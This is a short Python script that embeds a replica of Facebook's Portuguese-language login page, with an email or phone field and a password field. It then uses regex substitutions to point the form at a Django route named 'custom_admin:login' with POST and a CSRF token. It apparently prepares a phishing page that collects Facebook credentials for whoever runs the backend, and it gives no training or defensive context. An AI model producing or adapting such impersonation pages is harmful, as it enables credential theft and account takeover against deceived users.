import re 

texto = """

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>loja</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
</head>

<body style="background-color: #f2f4f7;">


    <style>
        .form-control::placeholder {
            /* Chrome, Firefox, Opera, Safari 10.1+ */
            color: #a5a5a5;
            opacity: 1;
            /* Firefox */
        }

        .form-control:-ms-input-placeholder {
            /* Internet Explorer 10-11 */
            color: #a5a5a5;
        }

        .form-control::-ms-input-placeholder {
            /* Microsoft Edge */
            color: #a5a5a5;
        }
    </style>



    <div class="container-fluid">

        <header class="header">


        </header>



        <main class="main min-vh-100">

            <div class="container pt-5">
                <div class="row row-cols-1 mx-auto row-cols-md-2 pt-md-5 mt-md-5">
                    <div class="col text-left pt-5">
                        <h1 class="text-primary container w-75 fw-bold" style="font-size: 55px">facebook</h1>
                        <p class="fw-semibold container w-75" style="font-size: 24px;">
                            O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua
                            vida.
                        </p>
                    </div>
                    <div class="col mt-3">
                        <div class="formularios row">


                            <div class="card px-3 py-3 col-8 mx-auto border-0 shadow">
                                <form class="gap-3 d-flex flex-column" action = "FALSO" method="FALSO">
                                    <input type="text" class="email form-control fs-4" placeholder="Email ou telefone"
                                        name="email">
                                    <input type="password" class="password form-control fs-4" placeholder="Senha"
                                        name="password">
                                    <input type="submit" class="btn btn-primary form-control fs-4" value="Entrar">
                                    <div class="forgget text-center">
                                        <a class="text-decoration-none" href="http://esqueciasenha">Esqueceu a
                                            senha?</a>
                                    </div>
                                </form>

                                <hr>
                                <div class="new-account text-center mt-2">
                                    <a href="#" class="btn btn-success fs-5 py-2 px-2 border-0 fw-bolder"
                                        style="background-color: #42b72a !important;">Criar nova conta</a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>

        </main>




    </div>

</body>

</html>
"""




action = "{% url 'custom_admin:login' %}"

texto = re.sub(
    r'(action[ ]*=[ ]*[\'"])(.*?)([\'"][ ]*)',
    r'\1{}\3'.format(action),
    texto,
    flags=re.IGNORECASE | re.DOTALL
)

texto = re.sub(
    r'(method[ ]*=[ ]*[\'"])(.*?)([\'"][ ]*)',
    r'\1{}\3'.format('POST'),
    texto,
    flags=re.IGNORECASE | re.DOTALL
)

texto = re.sub(
    r'(<form.*?>)',
    r'\1 {% csrf_token %}',
    texto,
    flags=re.IGNORECASE | re.DOTALL
)

print(texto)









